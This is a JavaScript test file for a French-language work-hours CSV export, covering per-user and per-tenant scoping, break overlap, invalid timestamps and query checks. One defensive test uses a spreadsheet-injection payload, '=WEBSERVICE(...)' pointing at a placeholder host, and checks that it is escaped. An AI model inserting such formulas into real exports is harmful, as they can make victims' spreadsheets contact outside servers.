import {test} from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {hoursExportScope,personalHoursExport,createHoursCsv} from '../web/live/hours-csv.js';

const company='company-a',user='user-a';
const row=(id,person=user,tenant=company)=>({
 id,company_id:tenant,session_id:'session-'+id,job_id:'job-1',
 started_at:'2026-11-04T10:00:00Z',ended_at:'2026-11-04T12:00:00Z',
 punch_sessions:{company_id:tenant,user_id:person,worker_id:'worker-1'}
});
const pause=(session_id,start,end,is_paid=false)=>({
 company_id:company,session_id,started_at:start,ended_at:end,is_paid
});
const fixtures={
 companyId:company,userId:user,ownOnly:true,essential:true,
 roster:[{id:'worker-1',employee_number:'E-009'}],
 locations:[{punch_job_id:'job-1',company_id:company,name:'Atelier central'}],
 jobs:[],
 rows:[row('own'),row('other','user-b'),row('foreign',user,'company-b')],
 breaks:[
  pause('session-own','2026-11-04T10:30:00Z','2026-11-04T11:00:00Z'),
  pause('session-own','2026-11-04T10:45:00Z','2026-11-04T11:15:00Z'),
  pause('session-own','2026-11-04T11:20:00Z','2026-11-04T11:30:00Z',true),
  {...pause('session-own','2026-11-04T10:00:00Z','2026-11-04T11:30:00Z'),company_id:'company-b'},
  pause('session-other','2026-11-04T10:00:00Z','2026-11-04T11:45:00Z')
 ]
};

test('export scope is personal for employees and own-hours even for boss',()=>{
 assert.equal(personalHoursExport('employee','home'),true);
 assert.equal(personalHoursExport('lead','home'),true);
 assert.equal(personalHoursExport('boss','hours'),true);
 assert.equal(personalHoursExport('admin','hours'),true);
 assert.equal(personalHoursExport('boss','team'),false);
 assert.equal(personalHoursExport('admin','management'),false);
 assert.deepEqual(hoursExportScope(company,user,'employee','hours'),{companyId:company,userId:user,ownOnly:true});
 assert.throws(()=>hoursExportScope('',user,'employee','hours'),/non vérifié/);
 assert.throws(()=>hoursExportScope(company,null,'employee','hours'),/non vérifié/);
});

test('personal export contains only own current-company sessions and counts overlapping unpaid break once',()=>{
 const exportResult=createHoursCsv(fixtures);
 assert.equal(exportResult.rows.length,1);
 const values=exportResult.rows[0];
 assert.equal(values[1],'E-009');
 assert.equal(values[2],'Atelier central');
 assert.equal(values[5],'2.0000');
 assert.equal(values[6],'0.7500');
 assert.equal(values[7],'1.2500');
 assert.equal(values[8],'');
 assert.match(exportResult.csv,/^\uFEFF"Segment";"Matricule";"Lieu"/);
 assert.doesNotMatch(exportResult.csv,/session-other/);
 assert.equal(exportResult.csv.split('\r\n').length,2);
});

test('team export includes current-company workers but not another tenant',()=>{
 const out=createHoursCsv({...fixtures,ownOnly:false});
 assert.equal(out.rows.length,2);
 assert.deepEqual(out.rows.map(x=>x[0]),['own','other']);
 assert.equal(out.rows[1][6],'1.7500');
 assert.equal(out.rows[1][7],'0.2500');
});

test('open or corrupted timestamps do not create fake confirmed payable hours',()=>{
 const open={...row('open'),ended_at:null};
 const corrupt={...row('corrupt'),ended_at:'invalid'};
 const backwards={...row('backwards'),ended_at:'2026-11-04T09:00:00Z'};
 const csv=createHoursCsv({...fixtures,rows:[open,corrupt,backwards],breaks:[]});
 assert.equal(csv.rows.length,3);
 assert.deepEqual(csv.rows.map(x=>x[8]),['SORTIE MANQUANTE','HORODATAGE INVALIDE','HORODATAGE INVALIDE']);
 for(const row of csv.rows)assert.deepEqual(row.slice(5,8),['','','']);
});

test('malicious spreadsheet cells are escaped, not executed as formulas',()=>{
 const dangerous={...row('dangerous'),id:'=WEBSERVICE("https://bad.example")',job_id:'job-x'};
 const csv=createHoursCsv({...fixtures,essential:false,rows:[dangerous],breaks:[],
  jobs:[{id:'job-x',company_id:company,number:'  =2+3'}]});
 assert.match(csv.csv,/"'=WEBSERVICE\(""https:\/\/bad\.example""\)"/);
 assert.match(csv.csv,/"'  =2\+3"/);
});

test('web export fetches only breaks of exported sessions and does not use the offline journal',()=>{
 const app=readFileSync(new URL('../web/live/app.js',import.meta.url),'utf8');
 const beginning=app.indexOf('async function exportHours(){');
 const ending=app.indexOf('\n\nfunction schedulePage()',beginning);
 const fn=app.slice(beginning,ending);
 assert.match(fn,/const scope=hoursExportScope\(company\(\),state\.user\?\.id,state\.account\?\.role,state\.section\)/);
 assert.match(fn,/\.eq\('company_id',scope\.companyId\)\.eq\('punch_sessions\.company_id',scope\.companyId\)/);
 assert.match(fn,/if\(scope\.ownOnly\)q=q\.eq\('punch_sessions\.user_id',scope\.userId\)/);
 assert.match(fn,/\.in\('session_id',batch\)/);
 assert.match(fn,/\.range\(offset,offset\+499\)/);
 assert.match(fn,/scope\.companyId!==company\(\)\|\|scope\.userId!==state\.user\?\.id/);
 assert.match(fn,/const content=createHoursCsv\(/);
 assert.doesNotMatch(fn,/projectPendingPunches|punchJournal\(/);
});
